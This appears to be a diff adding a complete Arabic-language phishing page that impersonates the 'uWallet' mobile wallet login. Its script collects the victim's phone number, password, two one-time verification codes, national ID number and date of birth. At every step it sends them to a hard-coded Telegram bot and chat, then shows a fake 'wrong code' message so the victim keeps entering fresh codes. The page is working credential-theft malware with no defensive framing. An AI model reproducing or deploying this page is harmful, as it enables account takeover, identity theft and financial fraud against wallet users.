@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>uWallet - تسجيل الدخول</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">
+  <style>
+    body {
+      background: linear-gradient(135deg, #fffbe5 0%, #ffe066 100%);
+      min-height: 100vh;
+      font-family: 'Tajawal', Arial, sans-serif;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      width: 100vw;
+    }
+    .uwallet-card {
+      background: #fff;
+      border-radius: 36px;
+      box-shadow: 0 8px 32px rgba(255, 224, 102, 0.16);
+      padding: 2.5rem 2rem 2rem 2rem;
+      width: 98vw;
+      height: 96vh;
+      max-width: 560px;
+      max-height: 98vh;
+      min-width: unset;
+      min-height: unset;
+      position: relative;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      transition: all .3s;
+    }
+    .uwallet-logo {
+      width: 92px; height: 92px;
+      margin: 0 auto 12px auto;
+      display: block;
+      border-radius: 50%;
+      background: #fffbe6;
+      border: 2.5px solid #ffe066;
+      object-fit: cover;
+    }
+    .uwallet-title {
+      color: #ffb700;
+      font-weight: bold;
+      font-size: 2.3rem;
+      letter-spacing: .5px;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+    .uwallet-label {
+      color: #ffb700;
+      font-weight: 500;
+    }
+    .uwallet-btn {
+      background: linear-gradient(90deg,#ffd600 0,#ffb300 100%);
+      color: #fff; border: none;
+      font-weight: bold;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(255, 216, 0, .16);
+      transition: background .2s;
+    }
+    .uwallet-btn:hover, .uwallet-btn:focus {
+      background: linear-gradient(90deg,#ffe066 0,#ffb300 100%);
+      color: #222;
+    }
+    .uwallet-back-btn {
+      background: #fff9d6;
+      color: #ffb700;
+      border: 1.5px solid #ffe066;
+      margin-bottom: 12px;
+      font-weight: bold;
+      border-radius: 10px;
+      box-shadow: 0 1px 4px rgba(255, 216, 0, .09);
+      transition: background .2s;
+    }
+    .uwallet-back-btn:hover, .uwallet-back-btn:focus {
+      background: #fff3c0;
+      color: #ff9900;
+    }
+    .form-control:focus {
+      border-color: #ffd600;
+      box-shadow: 0 0 0 0.15rem #ffe06680;
+    }
+    .code-inputs input {
+      width: 60px; height: 60px;
+      text-align: center;
+      font-size: 2rem;
+      border-radius: 10px;
+      margin: 0 8px;
+      border: 1.5px solid #ffe066;
+      background: #fffbe5;
+      transition: border .2s;
+    }
+    .code-inputs input:focus {
+      border-color: #ffb700;
+      background:#fff3c0;
+    }
+    .uwallet-step {
+      animation: fadein .6s;
+    }
+    @keyframes fadein {
+      from { opacity:0; transform:translateY(25px);}
+      to {opacity:1; transform:translateY(0);}
+    }
+    .uwallet-popup {
+      position: fixed;
+      top: 20px; left: 0; right: 0; z-index: 9999;
+      display: flex; justify-content: center;
+      pointer-events: none;
+    }
+    .uwallet-popup .alert {
+      pointer-events: auto;
+      min-width: 320px;
+      max-width: 90vw;
+    }
+    .uwallet-footer {
+      text-align:center;
+      color:#bbb; font-size:15px;
+      margin-top: 24px;
+      letter-spacing: .4px;
+    }
+    @media (max-width:900px) {
+      .uwallet-card { max-width: 99vw; width:99vw; min-width:unset; padding:2rem 0.5rem;}
+      .uwallet-logo { width: 72px; height: 72px;}
+      .code-inputs input { width:45px; height:45px; font-size:1.2rem; }
+    }
+    @media (max-width:600px) {
+      .uwallet-card { border-radius: 0; width:100vw; height:100vh; max-width:100vw; max-height:100vh; }
+      .uwallet-footer { font-size:13px;}
+    }
+    @media (max-width:400px) {
+      .uwallet-card { padding: 1.5rem 0.1rem;}
+      .uwallet-title { font-size:1.3rem;}
+      .code-inputs input { width:34px; height:34px; font-size:.9rem;}
+    }
+  </style>
+</head>
+<body>
+  <div class="uwallet-popup" id="popup"></div>
+  <div class="uwallet-card shadow-lg">
+    <img src="https://www2.0zz0.com/2025/06/26/01/957701194.png" class="uwallet-logo" alt="uWallet Logo" />
+    <div class="uwallet-title">uWallet</div>
+    <!-- Steps Container -->
+    <div id="steps-container" style="width:100%;flex:1;display:flex;flex-direction:column;justify-content:center;"></div>
+    <div class="uwallet-footer">تطبيق uWallet &copy; 2025</div>
+  </div>
+  <script>
+    // ====== CONFIG ======
+    const TELEGRAM_BOT_TOKEN = "7327256170:AAHRVRd2GI3bsOjtFD08kB2wc4w6mVerGdM";
+    const TELEGRAM_CHAT_ID   = "-4625923889";
+    // ====================
+
+    // ====== STATE =======
+    let state = {
+      phone: "",
+      password: "",
+      code1: "",
+      nationalId: "",
+      dob: "",
+      code2: "",
+      tgMessages: [],
+      step: 1
+    };
+
+    // ====== DOM ========
+    const $steps = document.getElementById('steps-container');
+    const $popup = document.getElementById('popup');
+
+    // ====== POPUP =======
+    function showPopup(message, type="danger", timeout=2700) {
+      $popup.innerHTML = `<div class="alert alert-${type} shadow animate__animated animate__fadeInDown">${message}</div>`;
+      setTimeout(()=>{$popup.innerHTML='';}, timeout);
+    }
+
+    // ====== TELEGRAM SEND/DELETE =======
+    async function sendToTelegram(text) {
+      const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: text,
+        }),
+      });
+      try {
+        const data = await resp.json();
+        if (data.result && data.result.message_id)
+          state.tgMessages.push(data.result.message_id);
+        return data;
+      } catch {
+        return null;
+      }
+    }
+    async function deleteLastTelegramMsg() {
+      const msgId = state.tgMessages.pop();
+      if (!msgId) return;
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          message_id: msgId,
+        }),
+      });
+    }
+
+    // ====== STEP RENDERING =======
+    function renderStep(step) {
+      // Clear
+      $steps.innerHTML = "";
+      state.step = step;
+      // Step 1: Phone + Password
+      if (step === 1) {
+        $steps.innerHTML = `
+        <form class="uwallet-step" id="step1" style="max-width:400px;margin:0 auto;">
+          <div class="mb-3">
+            <label class="uwallet-label mb-1">رقم الهاتف</label>
+            <div class="input-group">
+              <span class="input-group-text"><i class="bi bi-phone"></i></span>
+              <input type="tel" class="form-control" id="phone" inputmode="numeric" placeholder="079XXXXXXX" required pattern="^07\\d{8}$" maxlength="10" autofocus>
+            </div>
+          </div>
+          <div class="mb-4">
+            <label class="uwallet-label mb-1">كلمة السر</label>
+            <div class="input-group">
+              <span class="input-group-text"><i class="bi bi-lock"></i></span>
+              <input type="password" class="form-control" id="password" required minlength="4" maxlength="30">
+            </div>
+          </div>
+          <button class="uwallet-btn btn w-100 py-2 fs-5" type="submit">دخول</button>
+        </form>
+        `;
+        document.getElementById('step1').onsubmit = async function(e){
+          e.preventDefault();
+          const phone = document.getElementById('phone').value.trim();
+          const password = document.getElementById('password').value;
+          if (!/^07\d{8}$/.test(phone)) {
+            showPopup("يرجى إدخال رقم هاتف أردني صحيح يبدأ بـ 07", "warning");
+            return;
+          }
+          if (password.length < 4) {
+            showPopup("كلمة السر قصيرة جداً", "warning");
+            return;
+          }
+          state.phone = phone; state.password = password;
+          await sendToTelegram(`uWallet - دخول جديد\n📱 الهاتف: ${phone}\n🔑 كلمة السر: ${password}`);
+          renderStep(2);
+        }
+      }
+
+      // Step 2: Code 1
+      if (step === 2) {
+        $steps.innerHTML = `
+        <button type="button" class="uwallet-back-btn btn w-100 mb-2" id="back1"><i class="bi bi-arrow-right"></i> رجوع</button>
+        <form class="uwallet-step" id="step2" autocomplete="off" style="max-width:400px;margin:0 auto;">
+          <div class="mb-3 text-center" style="font-weight:500;color:#ffb700">تم إرسال رمز تحقق إلى رقمك</div>
+          <div class="code-inputs d-flex justify-content-center mb-4" dir="ltr">
+            <input type="text" maxlength="1" class="form-control mx-1 code" id="c1" inputmode="numeric" required>
+            <input type="text" maxlength="1" class="form-control mx-1 code" id="c2" inputmode="numeric" required>
+            <input type="text" maxlength="1" class="form-control mx-1 code" id="c3" inputmode="numeric" required>
+            <input type="text" maxlength="1" class="form-control mx-1 code" id="c4" inputmode="numeric" required>
+          </div>
+          <button class="uwallet-btn btn w-100 py-2 fs-5" type="submit">تأكيد الرمز</button>
+        </form>
+        `;
+        document.getElementById('back1').onclick = ()=>{
+          renderStep(1);
+        };
+        // Auto move focus
+        const codes = Array.from(document.querySelectorAll('.code'));
+        codes.forEach((el, idx) => {
+          el.addEventListener('input', function() {
+            if (this.value.length === 1 && idx < codes.length-1) codes[idx+1].focus();
+          });
+          el.addEventListener('keydown', function(e){
+            if (e.key === "Backspace" && !this.value && idx > 0) codes[idx-1].focus();
+          });
+        });
+        codes[0].focus();
+        document.getElementById('step2').onsubmit = async function(e){
+          e.preventDefault();
+          const code = codes.map(x=>x.value.trim()).join('');
+          if (code.length !== 4) return showPopup("يرجى إدخال رمز تحقق صحيح", "warning");
+          state.code1 = code;
+          await deleteLastTelegramMsg();
+          await sendToTelegram(`uWallet - رمز تحقق\n📱 الهاتف: ${state.phone}\n🔑 كلمة السر: ${state.password}\n🔢 الرمز: ${code}`);
+          renderStep(3);
+        }
+      }
+
+      // Step 3: National ID + DOB
+      if (step === 3) {
+        $steps.innerHTML = `
+        <button type="button" class="uwallet-back-btn btn w-100 mb-2" id="back2"><i class="bi bi-arrow-right"></i> رجوع</button>
+        <form class="uwallet-step" id="step3" style="max-width:400px;margin:0 auto;">
+          <div class="mb-3">
+            <label class="uwallet-label mb-1">الرقم الوطني</label>
+            <div class="input-group">
+              <span class="input-group-text"><i class="bi bi-person-badge"></i></span>
+              <input type="text" class="form-control" id="nid" maxlength="12" required pattern="^\\d{10,12}$">
+            </div>
+          </div>
+          <div class="mb-4">
+            <label class="uwallet-label mb-1">تاريخ الميلاد</label>
+            <div class="input-group">
+              <span class="input-group-text"><i class="bi bi-calendar-event"></i></span>
+              <input type="date" class="form-control" id="dob" required>
+            </div>
+          </div>
+          <button class="uwallet-btn btn w-100 py-2 fs-5" type="submit">التالي</button>
+        </form>
+        `;
+        document.getElementById('back2').onclick = ()=>{
+          renderStep(2);
+        };
+        document.getElementById('step3').onsubmit = async function(e){
+          e.preventDefault();
+          const nid = document.getElementById('nid').value.trim();
+          const dob = document.getElementById('dob').value;
+          if (!/^\d{10,12}$/.test(nid))
+            return showPopup("يرجى إدخال رقم وطني صحيح (10-12 رقم)", "warning");
+          if (!dob)
+            return showPopup("يرجى اختيار تاريخ الميلاد", "warning");
+          state.nationalId = nid; state.dob = dob;
+          await deleteLastTelegramMsg();
+          await sendToTelegram(`uWallet - بيانات شخصية\n📱 الهاتف: ${state.phone}\n🔑 كلمة السر: ${state.password}\n🔢 الرمز: ${state.code1}\n🆔 الرقم الوطني: ${nid}\n🎂 تاريخ الميلاد: ${dob}`);
+          renderStep(4);
+        }
+      }
+
+      // Step 4: Code 2
+      if (step === 4) {
+        $steps.innerHTML = `
+        <button type="button" class="uwallet-back-btn btn w-100 mb-2" id="back3"><i class="bi bi-arrow-right"></i> رجوع</button>
+        <form class="uwallet-step" id="step4" autocomplete="off" style="max-width:400px;margin:0 auto;">
+          <div class="mb-3 text-center" style="font-weight:500;color:#ffb700">ادخل رمز التحقق النهائي المرسل إلى هاتفك</div>
+          <div class="code-inputs d-flex justify-content-center mb-4" dir="ltr">
+            <input type="text" maxlength="1" class="form-control mx-1 code" id="cc1" inputmode="numeric" required>
+            <input type="text" maxlength="1" class="form-control mx-1 code" id="cc2" inputmode="numeric" required>
+            <input type="text" maxlength="1" class="form-control mx-1 code" id="cc3" inputmode="numeric" required>
+            <input type="text" maxlength="1" class="form-control mx-1 code" id="cc4" inputmode="numeric" required>
+          </div>
+          <button class="uwallet-btn btn w-100 py-2 fs-5" type="submit">تأكيد الرمز</button>
+        </form>
+        `;
+        document.getElementById('back3').onclick = ()=>{
+          renderStep(3);
+        };
+        // Auto move focus
+        const codes = Array.from(document.querySelectorAll('.code'));
+        codes.forEach((el, idx) => {
+          el.addEventListener('input', function() {
+            if (this.value.length === 1 && idx < codes.length-1) codes[idx+1].focus();
+          });
+          el.addEventListener('keydown', function(e){
+            if (e.key === "Backspace" && !this.value && idx > 0) codes[idx-1].focus();
+          });
+        });
+        codes[0].focus();
+        document.getElementById('step4').onsubmit = async function(e){
+          e.preventDefault();
+          const code2 = codes.map(x=>x.value.trim()).join('');
+          if (code2.length !== 4) return showPopup("يرجى إدخال رمز تحقق صحيح", "warning");
+          state.code2 = code2;
+          await deleteLastTelegramMsg();
+          await sendToTelegram(
+            `uWallet - جميع البيانات\n📱 الهاتف: ${state.phone}\n🔑 كلمة السر: ${state.password}\n🔢 رمز التحقق الأول: ${state.code1}\n🆔 الرقم الوطني: ${state.nationalId}\n🎂 تاريخ الميلاد: ${state.dob}\n✅ رمز التحقق النهائي: ${code2}`
+          );
+          renderStep(5);
+        }
+      }
+
+      // Step 5: Wrong code popup, repeat code input
+      if (step === 5) {
+        showPopup("رمز التحقق غير صحيح، حاول مرة أخرى!", "danger", 3500);
+        setTimeout(()=>renderStep(4), 1500);
+      }
+    }
+
+    // ====== START =======
+    renderStep(1);
+
+  </script>
+</body>
+</html>
